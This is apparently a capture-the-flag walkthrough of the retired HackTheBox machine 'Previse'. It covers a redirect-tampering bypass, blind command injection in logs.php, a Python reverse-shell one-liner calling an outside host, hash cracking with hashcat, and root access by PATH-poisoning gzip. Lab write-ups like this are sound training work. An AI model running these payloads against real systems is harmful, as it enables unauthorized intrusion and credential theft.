In this Writeup you will find walkthrough of the retired machine previse From Hackthebox

> export IP=10.10.11.104

# scanning :

## intial

```bash
sudo nmap -sV -vv $IP -oN nmap/intial
```

```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
```

visiting the web page :

![image](/assets/images/Previse/20211002032239.png)

tried some sqli but not worked

## directory brute-force :

```bash
$ gobuster dir -u http://10.10.11.104/ -w /usr/share/dirb/wordlists/big.txt -x php,txt
```

found :

```bash
/accounts.php         (Status: 302) [Size: 3994] [--> login.php]
/config.php           (Status: 200) [Size: 0]
/download.php         (Status: 302) [Size: 0] [--> login.php]
/files.php            (Status: 302) [Size: 4914] [--> login.php]
```

you can use curl without enabling redirect and will notice the same thing immediately

```bash
curl http://10.10.11.104/accounts.php -vvv
```

But i opened up my burpsuite and observe the requests and response for /accounts.php

- there is a redirect happen to /login.php again .
- i do intercept the redirect and found :

![image](/assets/images/Previse/20211002033401.png)

hence i want to view and interact with this page , i changed the
HTTP 302 redirect to HTTP 200 OK

![image](/assets/images/Previse/20211002033552.png)

forward it :

![image](/assets/images/Previse/20211002033625.png)

i made an account and then redirected me to /login.php again so i logged in successfully

![image](/assets/images/Previse/20211002034057.png)

navigating through the tabs found :

![image](/assets/images/Previse/20211002034221.png)

so i downloaded the backup and found :

![image](/assets/images/Previse/20211002034310.png)

in config.php :

```php
<?php

function connectDB(){
    $host = 'localhost';
    $user = 'root';
    $passwd = 'mySQL_p@ssw0rd!:)';
    $db = 'previse';
    $mycon = new mysqli($host, $user, $passwd, $db);
    return $mycon;
}

?>
```

after some navigating in the files :
in /logs.php

![image](/assets/images/Previse/20211002034826.png)

- so we can see the exec function which most likely indicating RCE , and python is executing on a script and seems the script saves output in out.log .

- understanding the logic at my local machine :

![image](/assets/images/Previse/20211002041124.png)

- so we can inject any command like : `delim=comma;INJECTION` However it won't be printed in logs.out so it is a Blind RCE .
- we can get a shell immediatley

[+] from [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python)

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.120",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

![image](/assets/images/Previse/20211002041508.png)

```python
# stablizie the shell
$ python -c "import pty;pty.spawn('/bin/bash')"
```

hence we are in the machine now so we can access local host and view data base :D

```bash
mysql -h localhost -u root -p previse
```

```sql

mysql> SELECT table_name FROM information_schema.tables;
```

- so we need m4lware password only `i guess :3` let's get it and try crack the hash from here:
  https://gist.github.com/dwallraff/6a50b5d2649afeb1803757560c176401

- we can see it is a md5crypt hash

```bash
$ hashcat -m 500 -a 0 hashed_m4lware /usr/share/wordlists/rockyou.txt
# 500 : md5crypt
# 0   : straight attack mode
# output :
$1$ðŸ§‚llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!
```

## privilege escalation

![image](/assets/images/Previse/20211002043918.png)

so let's read the script :

```bash
#!/bin/bash

# We always make sure to store logs, we take security SERIOUSLY here

# I know I shouldnt run this as root but I cant figure it out programmatically on my account
# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time

gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz

```

- so it simply makes a backup for the logs with gzip .
- we should focus on how to manipulate gzip .

### PATH poisoning

- we can see here :
  https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/

we can use that so when we execute this as root "with sudo" gzip will refer to the /tmp in the path

![image](/assets/images/Previse/20211002044848.png)

i don't know why but the shell doesn't return any result although i gained the root access so i make a reverse shell and it worked perfectly
